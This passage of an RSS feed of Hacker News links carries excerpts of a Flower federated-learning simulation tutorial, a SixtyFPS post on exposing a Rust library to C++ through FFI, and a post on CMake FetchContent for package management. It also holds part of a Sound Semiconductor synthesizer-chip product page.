</code></pre></article></div><p>In the next step we are going to define a function which allows us to start a Flower server with a customized <code>FedAvg</code> strategy. We customize two strategy parameters: the number of clients we expect to be connected before the training starts and the fraction of connected clients that are sampled during each round.</p><p>An Example: We want to sample 50 out of 100 clients. To do this we have to wait until 100 clients are connected, which we do by setting <code>min_available_clients</code> to <code>100</code>. The additional <code>fraction_fit=0.5</code> results in 50% of the clients being sampled for training.</p><p>Let's look at the actual code to start the server:</p><div><article><p>Copy</p><pre><code><span>def</span><span> </span><span>start_server</span><span>(</span><span>num_rounds: </span><span>int</span><span>, num_clients: </span><span>int</span><span>, fraction_fit: </span><span>float</span><span>):</span><span>
</span><span>    </span><span>"""Start the server with a slightly adjusted FedAvg strategy."""</span><span>
</span>    strategy = FedAvg(min_available_clients=num_clients, fraction_fit=fraction_fit)
<span>    </span><span># Exposes the server by default on port 8080</span><span>
</span><span>    fl.server.start_server(strategy=strategy, config={</span><span>"num_rounds"</span><span>: num_rounds})</span></code></pre></article></div><p>For more details into the <code>start_server</code> function checkout the <a href="https://flower.dev/docs/apiref-flwr.html#server-start-server">API Reference</a>.</p><p>Now it's time to define our client code. We are going to use a Keras model which will make the client code fairly simple.</p><div><article><p>Copy</p><pre><code><span>def</span><span> </span><span>start_client</span><span>(</span><span>dataset: DATASET</span><span>) -&gt; </span><span>None</span><span>:</span><span>
</span><span>    </span><span>"""Start a single client with the provided dataset."""</span><span>
</span>
<span>    </span><span># Load and compile a Keras model for CIFAR-10</span><span>
</span><span>    model = tf.keras.applications.MobileNetV2((</span><span>32</span><span>, </span><span>32</span><span>, </span><span>3</span><span>), classes=</span><span>10</span><span>, weights=</span><span>None</span><span>)
</span><span>    model.</span><span>compile</span><span>(</span><span>"adam"</span><span>, </span><span>"sparse_categorical_crossentropy"</span><span>, metrics=[</span><span>"accuracy"</span><span>])
</span>
<span>    </span><span># Unpack the CIFAR-10 dataset partition</span><span>
</span>    (x_train, y_train), (x_test, y_test) = dataset
<!-- -->
<span>    </span><span># Define a Flower client</span><span>
</span><span>    </span><span>class</span><span> </span><span>CifarClient</span><span>(</span><span>fl.client.NumPyClient</span><span>):</span><span>
</span><span>        </span><span>def</span><span> </span><span>get_parameters</span><span>(</span><span>self</span><span>):</span><span>
</span><span>            </span><span>"""Return current weights."""</span><span>
</span><span>            </span><span>return</span><span> model.get_weights()
</span>
<span>        </span><span>def</span><span> </span><span>fit</span><span>(</span><span>self, parameters, config</span><span>):</span><span>
</span><span>            </span><span>"""Fit model and return new weights as well as number of training examples."""</span><span>
</span>            model.set_weights(parameters)
<span>            </span><span># Remove steps_per_epoch if you want to train over the full dataset</span><span>
</span><span>            </span><span># https://keras.io/api/models/model_training_apis/#fit-method</span><span>
</span><span>            model.fit(x_train, y_train, epochs=</span><span>1</span><span>, batch_size=</span><span>32</span><span>, steps_per_epoch=</span><span>3</span><span>)
</span><span>            </span><span>return</span><span> model.get_weights(), </span><span>len</span><span>(x_train)
</span>
<span>        </span><span>def</span><span> </span><span>evaluate</span><span>(</span><span>self, parameters, config</span><span>):</span><span>
</span><span>            </span><span>"""Evaluate using provided parameters."""</span><span>
</span>            model.set_weights(parameters)
<!-- -->            loss, accuracy = model.evaluate(x_test, y_test)
<span>            </span><span>return</span><span> </span><span>len</span><span>(x_test), loss, accuracy
</span>
<span>    </span><span># Start Flower client</span><span>
</span><span>    fl.client.start_numpy_client(</span><span>"0.0.0.0:8080"</span><span>, client=CifarClient())</span></code></pre></article></div><p>Finally we can bring everything together. We are going to load the dataset and provide each partition to a single client exclusively. The server and each client will have its own process which is started in our main process.</p><div><article><p>Copy</p><pre><code><span>def</span><span> </span><span>run_simulation</span><span>(</span><span>num_rounds: </span><span>int</span><span>, num_clients: </span><span>int</span><span>, fraction_fit: </span><span>float</span><span>):</span><span>
</span><span>    </span><span>"""Start a FL simulation."""</span><span>
</span>
<span>    </span><span># This will hold all the processes which we are going to create</span><span>
</span>    processes = []
<!-- -->
<span>    </span><span># Start the server</span><span>
</span>    server_process = Process(target=start_server, args=(num_rounds, num_clients, fraction_fit))
<!-- -->    server_process.start()
<!-- -->    processes.append(server_process)
<!-- -->
<span>    </span><span># Optionally block the script here for a second or two so the server has time to start</span><span>
</span><span>    time.sleep(</span><span>2</span><span>)
</span>
<span>    </span><span># Load the dataset partitions</span><span>
</span>    partitions = dataset.load(num_partitions=num_clients)
<!-- -->
<span>    </span><span># Start all the clients</span><span>
</span><span>    </span><span>for</span><span> partition </span><span>in</span><span> partitions:
</span>        client_process = Process(target=start_client, args=(partition,))
<!-- -->        client_process.start()
<!-- -->        processes.append(client_process)
<!-- -->
<span>    </span><span># Block until all processes are finished</span><span>
</span><span>    </span><span>for</span><span> p </span><span>in</span><span> processes:
</span>        p.join()
<!-- -->
<!-- -->
<span></span><span>if</span><span> __name__ == </span><span>"__main__"</span><span>:
</span><span>    run_simulation(num_rounds=</span><span>100</span><span>, num_clients=</span><span>10</span><span>, fraction_fit=</span><span>0.5</span><span>)</span></code></pre></article></div><h2>Setup with and without Docker</h2><p>In the <a href="https://github.com/adap/flower/tree/main/examples/simulation">example</a> code in our repository you will also find a Dockerfile as well as a <code>run.sh</code> shell script. If you have Docker installed you can simply run the shell script. It will build the Docker container and start the simulation. Alternatively checkout the <a href="https://github.com/adap/flower/tree/main/examples/simulation/README.md">README.md</a> which describes how to install the example project.</p><h2>Summary</h2><p>Although Federated Learning is hard, Flower can make it effortless to create a simulation which is already quite accurate and easily runs on a single machine. Feel free to experiment with different number of clients, rounds, fraction of clients which perform training on each round and many more hyperparameters. If questions should arise our growing community is always happy to support and can be found on our <a href="https://flower.dev/join-slack">Slack Community</a>.</p><p>If you like …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://flower.dev/blog/2021-01-14-single-machine-simulation-of-federated-learning-systems">https://flower.dev/blog/2021-01-14-single-machine-simulation-of-federated-learning-systems</a></em></p>]]>
            </description>
            <link>https://flower.dev/blog/2021-01-14-single-machine-simulation-of-federated-learning-systems</link>
            <guid isPermaLink="false">hacker-news-small-sites-25779486</guid>
            <pubDate>Thu, 14 Jan 2021 17:46:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Expose a Rust Library to Other Languages (Esp. C++)]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25779349">thread link</a>) | @ogoffart
<br/>
January 14, 2021 | https://sixtyfps.io/blog/expose-rust-library-to-other-languages.html | <a href="https://web.archive.org/web/*/https://sixtyfps.io/blog/expose-rust-library-to-other-languages.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

        
    <section>
        <div>

    
    <h5>Posted on January 13, 2021 by Olivier Goffart and Simon Hausmann</h5>
    
  <p>
    With <a href="https://sixtyfps.io/">SixtyFPS</a>, we are creating a GUI toolkit. We chose
    Rust as the implementation language for our runtime library, and we want to make the same library usable from different
    programming languages. We believe programmers in all languages need to build GUIs - powered by the same runtime library.
    Rust, with its Foreign Function Interface (FFI) is an excellent choice.<br> In
    this article we look at how to expose an idiomatic C++ API from our Rust library.
  </p>

<h3 id="the-challenge">The Challenge</h3>

    <p>Initially we chose to start with support for three languages:</p>
    <ul>
        <li><b>Rust</b>: Because it's our implementation language.</li>
        <li><b>C++</b>: It's a low level language that we're familiar with, and is still one of the most established languages
            in the embedded device space.</li>
        <li><b>JavaScript / TypeScript</b>: Because it's a very popular dynamic language.</li>
    </ul>


    <p><img src="https://sixtyfps.io/blog/expose-rust-library-to-other-languages/diagrams.png"></p><p>The Rust library (also known as a crate) is split into two parts, the shared implementation crate and a thin idiomatic
        API crate.
    </p>
    <p>For JavaScript we use <a href="https://github.com/neon-bindings/neon">Neon</a> to expose an API. Neon enables us
        to conveniently write JavaScript APIs and create an NPM package.</p>
    <p>The C++ part is a bit more challenging.</p>

<h3 id="expose-idiomatic-cpp-api-through-ffi">Expose an Idiomatic C++ API through Rust FFI</h3>

    <p>We decided to keep the C++ API only in the header files. This is because, unlike with Rust, there's
        no widely adopted C++ equivalent of Cargo, to help with downloading and building dependencies. If we want to ship
        binaries, then we have to maintain ABI compatibility, which is difficult in C++.<br> This way, we can also keep the
        C++ binding as lightweight as possible: for performance and memory footprint.
    </p>
    
    <p>Rust cannot expose a C++ API: structures can only be exported using a C representation (<code>#[repr(C)]</code>) and
        <code>extern "C"</code> functions. This means that we cannot expose Rust features like traits, generics, or
        destructors even if they have a C++ equivalent.
     </p>
     
    <p>The Rust ecosystem provides a few helper crates to make the job easier:</p>
     <ul>
        <li><a href="https://github.com/eqrion/cbindgen"><b>cbindgen</b></a>: This helper crate automatically generates C/C++
            header files based on the <code>repr(C)</code> structure and the <code>extern "C"</code> functions. We use
            cbindgen to generate internal header files only. It's very helpful to avoid manually writing some unsafe error-prone
            boilerplate. 
        </li>
        <li><a href="https://github.com/mystor/rust-cpp">The <b>cpp</b> crate</a>: This
            helper crate is useful when calling C++ libraries from Rust, and we make use of that. However it is not suitable for
            exposing a C++ API from Rust. (Note: Olivier Goffart happens to be the maintainer.)
        </li>
                
        <li><a href="https://cxx.rs/">The <b>cxx</b> crate</a>: This would be a safer way than cbindgen to ensure that the
            interface between C++ and Rust is correct. While it could be useful, cbindgen already get us a long way. So
            we don't use it for now.
        </li>
    </ul>

<p>To build the correct shared library we use Cargo. The resulting library exports C mangled symbols. We ship
    a set of C++ header files that provide the C++ API and use the C functions behind the scenes. For convenience,
    we provide a CMake integration that ties together the library linkage and includes path setup. </p>

<h3 id="slices-vectors-strings">Slices, Vectors, and Strings</h3>

    <p>
    In FFI, passing a basic integer works out of the box. But what about more complex data types, like a 
    Rust slice or a string? Well, most classes like Rust's String, Vec, or slices are not <code>#[repr(C)]</code>,
    so we can't use them directly. While we could use these classes with an indirection, every simple call may need to go
    through a non-inline function boundary. So we would need to convert types, which means re-allocating memory.</p>
    <p>So instead of sharing code, we implemented data structures using <code>#[repr(C)]</code> and a stable ABI, so
        that they can be accessed directly from C++ and Rust, or any low-level language.</p>

   <p>For the slice we create a structure that holds a pointer and a size:</p>

<pre><code>#[repr(C)]
pub struct Slice&lt;'a, T&gt; {
    ptr: NonNull&lt;T&gt;,
    len: usize,
    phantom: PhantomData&lt;&amp;'a [T]&gt;,
}
</code></pre>

<p><code>Slice&lt;'a, T&gt;</code> can be dereferenced to <code>&amp;'a [T]</code>.
    In C++, cbindgen generates the following snippet:


</p><pre><code>template&lt;typename T&gt;
struct Slice {
    T *ptr;
    uintptr_t len;
};
</code></pre>

<p>We tell cbindgen to generate that code in a <code>cbindgen_private</code> namespace, and we wrap it an interface
similar to <code>std::span</code>.</p>

<p>We use strings and vectors to pass data between the engine and the user's code. This results in
    shared ownership where we want to avoid unnecessary copying of data. Our API is property based
    with setters and getters, therefore we implement shared ownership through
    <a href="https://en.wikipedia.org/wiki/Copy-on-write"></a>Implicit sharing / Copy-on-write. </p>

<p><img src="https://sixtyfps.io/blog/expose-rust-library-to-other-languages/sharedvector.png"></p><pre><code>#[repr(C)]
struct SharedVectorHeader {
    refcount: atomic::AtomicIsize,
    size: usize,
    capacity: usize,
}

#[repr(C)]
pub struct SharedVector&lt;T&gt; {
    inner: NonNull&lt;SharedVectorInner&lt;T&gt;&gt;,
}


/// These functions are called from the C++ constructor
/// and destructor
#[no_mangle]
pub unsafe extern "C" fn sixtyfps_shared_vector_allocate(
    size: usize, align: usize) -&gt; *mut u8 { /*...*/ }
#[no_mangle]
pub unsafe extern "C" fn sixtyfps_shared_vector_free(
    ptr: *mut u8, size: usize, align: usize) { /*...*/ }
}
</code></pre>

<p>In Rust, the <code>impl Clone</code> and <code>impl Drop</code> make sure to increment
and decrement the atomic reference count and call the destructors. Similarly, in C++, we implement
copy constructor and destructor for the same purpose. Note that we still need to call the Rust
allocator function via the exposed C interface.</p>

<p>Now we can write a wrapper in C++:
(<a href="https://github.com/sixtyfpsui/sixtyfps/blob/master/api/sixtyfps-cpp/include/sixtyfps_sharedvector.h">full file</a>)
</p>

<pre><code>template&lt;typename T&gt; struct SharedVector {
  SharedVector() : inner(nullptr) {}

  SharedVector(const SharedVector &amp;other)
    : inner(other.inner)
  { if (inner) ++inner-&gt;refcount; }

  ~SharedVector() {
     if (inner &amp;&amp; (--inner-&gt;refcount) == 0) {
        for (auto it = begin(); it &lt; end(); ++it)
            it-&gt;~T();
        cbindgen_private::sixtyfps_shared_vector_free(
            reinterpret_cast&lt;uint8_t *&gt;(inner),
            sizeof(SharedVectorHeader)
                + inner-&gt;capacity * sizeof(T),
            alignof(SharedVectorHeader));
     }
  }
  SharedVector &amp;operator=(const SharedVector &amp;other)
  { /*...*/ }

  const T *begin() const { /* ... */ }
  const T *end() const { /* ... */ }
  void push_back(const T &amp;value) { /* ... */ }
  // ... more vector-like API

private:
  // (SharedVectorHeader is generated by cbindgen)
  cbindgen_private::SharedVectorHeader *inner;
};
</code></pre>


    <p>Right now these types, such as <a href="https://sixtyfps.io/docs/rust/sixtyfps/struct.sharedvector">SharedVector</a> and
        <a href="https://sixtyfps.io/docs/rust/sixtyfps/struct.sharedstring">SharedString</a>, are within the internal <code>sixtyfps-corelib</code>
        crate, and re-exported for Rust users through the public <code>sixtyfps</code> crate.  If there is demand for it, we may consider moving them into a
        smaller public crate with its own release schedule.</p>


<h3 id="destructors">Destructors</h3>

    <p>It's important to note that <a href="https://sixtyfps.io/docs/rust/sixtyfps/struct.sharedvector">SharedVector</a> and
        <a href="https://sixtyfps.io/docs/rust/sixtyfps/struct.sharedstring">SharedString</a> have destructors in C++.
        We can't pass instances by value in <code>extern "C"</code> functions, because the calling conventions are different
        for arguments or return types with C++ destructors; not supported by C. Therefore we can only pass them by pointer
        or reference.
    </p>

    <p>If we want to add a C++ destructor, constructor, or any member functions to types directly exported by cbindgen to our public API, 
        we use 
        <code><a href="https://docs.rs/cbindgen/0.16.0/cbindgen/struct.ExportConfig.html">cbindgen::ExportConfig</a>::body</code>:</p>

<pre><code>cbindgen_config.export.body.insert(
    "MyStruct".to_owned(),
    "    inline MyStruct(); inline ~MyStruct();".to_owned()
  );
</code></pre>

    <p>
    Then we implement <code>MyStruct::MyStruct</code> and <code>MyStruct::~MyStruct</code> in a manually
    written header file, by either doing the memory management directly or calling C helper functions
    implemented in Rust.</p>
     <p>It's important to keep in mind that anything allocated from Rust needs to be freed by Rust. 
    The same applies to allocations in C++: they might not share the same allocator.
    </p>

<h3 id="dynamic-dispatch">Dynamic Dispatch (virtual table) Across the Language Barrier</h3>

<p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e2/Bon_toutou.png/186px-Bon_toutou.png"></p><p>
    Let's start with the classic example of dynamic dispatch in Rust:</p>
<pre><code>pub trait Animal {
  fn speak(&amp;self, loudness: i32) -&gt; String;
}
struct Dog { name: String }
impl Animal for Dog {
  fn speak(&amp;self, loudness: i32) -&gt; String
  { "Waf!".into() }
}
#[no_mangle]
pub extern "C" fn do_something_with(
  animal: &amp;dyn Animal
) {
  println!("{}", animal.speak(1));
}
</code></pre>

<p>Unfortunately the above code does not work. How could we implement a class <code>Cat</code>
in C++ and call the <code>do_something_with</code> function? What if we wanted to implement
<code>do_something_with</code> in C++? The problem is that trait objects (<code>&amp;dyn</code>) are not
valid in FFI - their binary representation is not guaranteed to be stable. If we try to compile the above code,
we get this warning:</p>

<pre><code>warning: `extern` fn uses type `dyn Animal`, which is not FFI-safe
  | extern "C" fn do_something_with(animal: &amp;dyn Animal)
  |                                         ^^^^^^^^^^^ not FFI-safe
  = note: `#[warn(improper_ctypes_definitions)]` on by default
  = note: trait objects have no C equivalent</code></pre>

  <!--https://doc.rust-lang.org/reference/types/trait-object.html-->
<p>Internally, <a href="https://brson.github.io/rust-anthology/1/all-about-trait-objects.html">we know</a> that
a trait object is composed of a pointer to the instance, and a pointer to a virtual table containing
pointers to functions. The layout of this trait object (which pointer comes first) and the layout of the virtual
table is an implementation detail of Rust. So we decided to re-implement them to work accross FFI. Instead of
writing a <code>trait Animal</code>, we write a virtual table by hand:</p>

<pre><code>#[repr(C)]
pub struct AnimalVTable {
    speak: extern "C" fn speak(
        VRef&lt;AnimalVTable&gt;, i32, &amp; mut SharedString);
}
</code></pre>
<p>In this case, our virtual table has only one function. It is <code>#[repr(C)]</code> so that
cbindgen can generate a structure that the C++ code can access. Since we can't use <code>String</code>
we changed the return type to <code>SharedString</code>. We also pass the parameter by mutable reference instead
of just returning it, because it is not allowed to return a type that has a destructor.<br>
Instead of passing a trait object, our functions receive a pointer to the virtual table and
a …</p></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://sixtyfps.io/blog/expose-rust-library-to-other-languages.html">https://sixtyfps.io/blog/expose-rust-library-to-other-languages.html</a></em></p>]]>
            </description>
            <link>https://sixtyfps.io/blog/expose-rust-library-to-other-languages.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25779349</guid>
            <pubDate>Thu, 14 Jan 2021 17:36:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CMake and the Future of C++ Package Management]]>
            </title>
            <description>
<![CDATA[
Score 19 | Comments 14 (<a href="https://news.ycombinator.com/item?id=25779120">thread link</a>) | @ibobev
<br/>
January 14, 2021 | http://ibob.github.io/blog/2020/01/13/cmake-package-management/ | <a href="https://web.archive.org/web/*/http://ibob.github.io/blog/2020/01/13/cmake-package-management/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<nav>
<ul>
    <li><a href="http://ibob.github.io/blog/">Blog home</a></li>
    <li><a href="http://ibob.github.io/blog/tags/">Tags</a></li>
    <li>
    <a href="http://ibob.github.io/feed.xml" title="iboB blog feed" target="_blank">
        
        <span>RSS Feed</span>
    </a>
    </li>
</ul>
</nav>
<section>
  
  <p>Published on Jan 13, 2020.
    </p>
  <p><em>Well, at least according to me</em></p>

<p>I recently encountered a CMake feature which I wasn’t aware of. It’s <a href="https://cmake.org/cmake/help/latest/module/FetchContent.html">FetchContent</a>. I’m sure this is not news to most people since it was added in CMake 3.14<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> and that’s been around since February of 2019, so two years now, but this feature is a revelation.</p>

<p>It can… no, it should… no, it <em>must</em> become the stepping stone for future of C and C++ package managers.</p>

<p><em>… after an issue with it is resolved, which I will talk about furhter down in the post</em></p>

<h2 id="so-what-is-fetchcontent">So, what is FetchContent?</h2>

<p>It’s pretty straight forward, actually. By using two CMake functions: <code>FetchContent_Declare</code> and <code>FetchContent_MakeAvailable</code><sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup> users can declare a named content item which can then be… well… fetched <em>in configure time</em>. The key here is, as opposed to <code>file(DOWNLOAD ...)</code>, this allows three important things:</p>

<ul>
  <li>Define the means by which the content is produced (not just source, but also types of sources)</li>
  <li>Have an identifiable name for the content</li>
  <li>Maintain the coherency of the content in a well-defined manner</li>
</ul>

<p>Here’s an example directly from the CMake docs:</p>

<div><div><pre><code><span>include</span><span>(</span>FetchContent<span>)</span>
<span>FetchContent_Declare</span><span>(</span>
  googletest
  GIT_REPOSITORY https://github.com/google/googletest.git
  GIT_TAG        release-1.8.0
<span>)</span>
<span>FetchContent_Declare</span><span>(</span>
  Catch2
  GIT_REPOSITORY https://github.com/catchorg/Catch2.git
  GIT_TAG        v2.5.0
<span>)</span>

<span># After the following call, the CMake targets defined by googletest and</span>
<span># Catch2 will be defined and available to the rest of the build</span>
<span>FetchContent_MakeAvailable</span><span>(</span>googletest Catch2<span>)</span>
</code></pre></div></div>

<p>Ha! <code>GIT_REPOSITORY</code>! See? See? This lets us use CMake for package management.</p>

<h2 id="but-what-about-my-favorite-package-manager">But what about My-Favorite-Package-Manager™?</h2>

<p>I get it. Conan, vcpkg and the many<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup> others that exist are great, but they are external. Of course I’ve experimented with the popular C++ package managers, but I’ve been reluctant to actually start using one for my projects. They may have CMake integrations but they are not triggered by CMake. They try — and succeed — to be more than CMake. The thing is that, like it or not, CMake is, or at least getting really close to being, the de-facto standard build system for C++<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup>. CMake is terrible in many ways, but it has proven to be the best we’ve have<sup id="fnref:5" role="doc-noteref"><a href="#fn:5">5</a></sup>.</p>

<p>So what do we get by bundling the package manager with the build system?</p>

<p><a href="https://en.wikipedia.org/wiki/Nix_package_manager">Nix</a> (which is awesome) or <a href="https://doc.rust-lang.org/cargo/guide/">Rust’s Cargo</a></p>

<h3 id="packages-from-source">Packages from source</h3>

<p>Oh, this package has <code>CMakeLists.txt</code>? You don’t need to download a binary when you can just fetch it and <code>add_subdirectory</code>… it<sup id="fnref:6" role="doc-noteref"><a href="#fn:6">6</a></sup>. It will inherit everything you need from your project.</p>

<h3 id="only-the-packages-we-need">Only the packages we need</h3>

<p>Sure, you can define different packages depending on platform, <a href="https://vcpkg.readthedocs.io/en/latest/users/triplets/">triplet</a>, and other configurations from other package managers, but you’re using their language. And then you have to either reimplement the same configuration analysis in you CMake files, or use some exports from those package managers, which is not always easy. If your package manager is within CMake, you already, inevitably, have all the tools to configure your build. The information for <a href="https://cmake.org/cmake/help/v3.3/variable/CMAKE_LANG_COMPILER.html">the compiler</a>, the <a href="https://cmake.org/cmake/help/latest/variable/CMAKE_CXX_STANDARD.html">standard</a>, the <a href="https://cmake.org/cmake/help/latest/variable/CMAKE_SYSTEM_NAME.html">target platform</a>, the <a href="https://cmake.org/cmake/help/latest/variable/CMAKE_SYSTEM_PROCESSOR.html">architecture</a>, the <a href="https://cmake.org/cmake/help/latest/variable/BUILD_SHARED_LIBS.html">linkage</a>, and <a href="https://cmake.org/cmake/help/latest/manual/cmake-toolchains.7.html">everything else</a> is already there.</p>

<h3 id="single-command-configuration">Single command configuration</h3>

<p><code>$ cmake .</code></p>

<p>…and everything works, everything is up to date, and everything is there. You are ready to build.</p>

<h2 id="can-i-use-fetchcontent-now">Can I use FetchContent now?</h2>

<p>Sort of.</p>

<p>Of course you can use the raw calls, even though they are not yet a package manager. <a href="https://github.com/adobe/lagrange/tree/72f9a5447b6803245d43a37a18b76e59c16fbda8/cmake/recipes/external">Adobe do exactly that</a>.</p>

<p>And, though the feature has been around for some time, I’m only aware of a single package manager which is built with it: <a href="https://github.com/TheLartians/CPM.cmake">CPM</a>.</p>

<p>Now, CPM is awesome and I’ve started using it in my personal projects. Everything new I make uses CPM and I’ve migrated some old stuff, too. However it’s not a mature and complete package manager. It can’t error on package version inconsistencies (though it can detect them) and it’s not built to handle binary packages. Source only. That, however, might be the thing you need. It is enough for most of my needs. I wholeheartedly recommend it for personal and/or small projects.</p>

<p>But!</p>

<p>There is a huge problem. Not with CPM, but with FetchContent itself. FetchContent can’t be <strong>the</strong> API package managers are built upon today.</p>

<p>This problem is performance. FetchContent is just too slow to be used for a serious load. It’s not an unfixable problem, but as far as I understand the issue, it will most likely have to be reimplemented. Here’s a table with me experimentig on different machines containing roughly<sup id="fnref:7" role="doc-noteref"><a href="#fn:7">7</a></sup> how much time it takes to run FetchContent per content item, or package. <a href="https://github.com/iboB/cmake-fetch-content-perf/blob/82ee13918550f18bbf22bd3bf38c721a7de9fb80/CMakeLists.txt">Here’s the CMakeLists.txt</a> I used. Note that these times are not from fetching the packages. They are from a “noop” run. One which identifies that everything is up to date, and does nothing.</p>

<table>
  <thead>
    <tr>
      <th>OS</th>
      <th>CMake Version</th>
      <th>Generator</th>
      <th>Machine</th>
      <th>~ ms per item</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Ubuntu 20.04</td>
      <td>3.16.3</td>
      <td>Unix Makefiles</td>
      <td>ThreadRipper, SSD</td>
      <td>200</td>
    </tr>
    <tr>
      <td>Arch Linux</td>
      <td>3.19.2</td>
      <td>Unix Makefiles</td>
      <td>8 core @ 2.4 GHz, HDD</td>
      <td>800</td>
    </tr>
    <tr>
      <td>Windows 10</td>
      <td>3.19.2</td>
      <td>Visual Studio 2019</td>
      <td>ThreadRipper, SSD</td>
      <td>1200</td>
    </tr>
    <tr>
      <td>Windows 10</td>
      <td>3.19.2</td>
      <td>MinGW Makefiles</td>
      <td>ThreadRipper, SSD</td>
      <td>1200</td>
    </tr>
    <tr>
      <td>Windows 10</td>
      <td>3.16.3</td>
      <td>MinGW Makefiles</td>
      <td>6 core @ 3 GHz, SSD</td>
      <td>1500</td>
    </tr>
  </tbody>
</table>

<p>That’s at <em>configure time</em>, so every time the CMake scripts are touched, it will get executed. As you can see even the best time of roughly 200 ms per item is pretty bad, but the Windows times of over 1 second are abysmal. It’s simply prohibitive for a project with hundreds or even tens of dependencies to spend 1 second per dependency only to confirm that it’s up to date.</p>

<p>I opened <a href="https://gitlab.kitware.com/cmake/cmake/-/issues/21703">an issue on CMake’s tracker</a><sup id="fnref:8" role="doc-noteref"><a href="#fn:8">8</a></sup> about that, and hopefully it will get addressed in some way. I even have some ideas of how this can be addressed from the outside, just with CMake user code, but I hope it won’t come to this.</p>

<p>I truly believe that this is the future of C++ package management. If the preformance issue is fixed (or worked around), I think in several years C++ package management will be based on FetchContent. Whether CPM will become <em>the</em> new de-facto standard or some other not-yet-written software, I can’t tell, but this is it! I can feel it!</p>

<hr>



</section>







  
  



  

</div></div>]]>
            </description>
            <link>http://ibob.github.io/blog/2020/01/13/cmake-package-management/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25779120</guid>
            <pubDate>Thu, 14 Jan 2021 17:20:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Sound Semiconductor – IC's for Music Creation]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25778717">thread link</a>) | @todsacerdoti
<br/>
January 14, 2021 | http://www.soundsemiconductor.com/index.html | <a href="https://web.archive.org/web/*/http://www.soundsemiconductor.com/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <div>
                    <h2>SSI2130</h2>
                    <h4>Voltage Controlled Oscillator</h4>
                    <p><img src="http://www.soundsemiconductor.com/images/ssi2130chip.jpg"></p><p>Designer Derek Bowers has been imagining this chip since building his first synth during college! The FatKeys™ SSI2130 provides beautiful triangle, sawtooth, pulse, and square waveforms with unprecedented temperature stability; and adds an on-chip mixer, low distortion sine wave generator, through-zero FM/PM capability and more in an ultra-compact PCB footprint.</p>
                    <p><a href="http://www.soundsemiconductor.com/downloads/ssi2130datasheet.pdf" role="button">Data Sheet »</a><a href="http://www.soundsemiconductor.com/downloads/PODPQN32.pdf" role="button">Pkg. Spec. »</a></p>
                </div>
                <div>
                    <h2>SSI2131</h2>
                    <h4>Voltage Controlled Oscillator</h4>
                    <p><img src="http://www.soundsemiconductor.com/images/ssi2131chip.jpg"></p><p>The FatKeys™ SSI2131 Voltage Controlled Oscillator provides the core VCO function with triangle, sawtooth, and PWM-variable pulse waveform outputs over a ten-octave range. The device offers unparalleled temperature stability, exponentiality, waveform integrity, and ease of use while requiring an absolute minimum of external components.</p>
                    <p><a href="http://www.soundsemiconductor.com/downloads/ssi2131datasheet.pdf" role="button">Data Sheet »</a><a href="http://www.soundsemiconductor.com/downloads/PODPSL16.pdf" role="button">Pkg. Spec. »</a></p>
                </div>
                <div>
                    <h2>SSI2140</h2>
                    <h4>Voltage Controlled Multi-Mode Filter</h4>
                    <p><img src="http://www.soundsemiconductor.com/images/ssi2140chip.jpg"></p><p>A refresh of a classic design, the FatKeys™ SSI2140 preverses mojo of the beloved SSM2040 and adds temperature compensation of <i>gm</i> cells and the exponential control port. A "Q VCA" is provided to allow easy resonance control as well as various options for Q compensation. The four transconductance cells are highly configurable for a variety of pole and mode combinations.</p>
                    <p><a href="http://www.soundsemiconductor.com/downloads/ssi2140datasheet.pdf" role="button">Data Sheet »</a><a href="http://www.soundsemiconductor.com/downloads/PODPSSL20.pdf" role="button">Pkg. Spec. »</a></p>
                </div>
                <div>
                    <h2>SSI2144</h2>
                    <h4>Voltage Controlled Low-Pass Filter</h4>
                    <p><img src="http://www.soundsemiconductor.com/images/ssi2144chip.jpg"></p><p>The second of two legendary SSM filter updates, the FatKeys™ SSI2144 is a dedicated four-pole low-pass ladder filter with on-chip resonance control. Original designer Dave Rossum did a number of performance updates such as lower noise, improved control feedthrough, and logical pin grouping but otherwise left this sweet-sounding VCF alone.</p>
                    <p><a href="http://www.soundsemiconductor.com/downloads/ssi2144datasheet.pdf" role="button">Data Sheet »</a><a href="http://www.soundsemiconductor.com/downloads/PODPSSL16.pdf" role="button">Pkg. Spec. »</a></p>
                </div>
                <div>
                    <h2>SSI2161</h2>
                    <h4>Voltage Controlled Amplifier</h4>
                    <p><img src="http://www.soundsemiconductor.com/images/ssi2161chip.jpg"></p><p>A very high performance single-channel VCA for the most demanding applications, the ProCircuit™ SSI2161 offers industry-leading lowest-noise, and a mode control to optimize noise vs. distortion performance. All at low-cost and in a 10-lead SSOP package.</p>
                    <p><a href="http://www.soundsemiconductor.com/downloads/ssi2161datasheet.pdf" role="button">Data Sheet »</a><a href="http://www.soundsemiconductor.com/downloads/PODPSSL10.pdf" role="button">Pkg. Spec. »</a></p>
                </div>
                <div>
                    <h2>SSI2162</h2>
                    <h4>Voltage Controlled Amplifier</h4>
                    <p><img src="http://www.soundsemiconductor.com/images/ssi2162chip.jpg"></p><p>The FatKeys™ SSI2162 provides two independent VCA channels, and like its SSI2161 and SSI2164 siblings offers great flexibility in design of dynamics processors, automatic or remote level control, and voltage controlled filters. Highly compact 10-lead SSOP package.</p>
